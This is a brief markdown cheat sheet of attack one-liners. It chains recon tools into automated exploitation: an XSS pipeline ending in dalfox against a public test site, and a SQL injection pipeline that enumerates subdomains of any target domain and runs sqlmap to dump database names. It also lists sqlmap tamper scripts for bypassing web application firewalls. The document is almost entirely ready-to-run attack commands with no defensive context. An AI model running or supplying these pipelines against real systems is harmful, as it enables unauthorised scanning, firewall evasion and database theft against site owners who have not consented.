# OneLiner

## XSS
``` gau testphp.vulnweb.com | kxss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe ```

## Sqli
```
subfinder -d target.com | tee -a domains
cat domains | httpx | tee -a urls.alive
cat urls.alive | waybackurls | tee -a urls.check
gf sqli urls.check >> urls.sqli
sqlmap -m urls.sqli --dbs --batch
```
If you need to bypass WAF (Web Application Firewall) in the process, add the following options to sqlmap:

```
--level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned
```
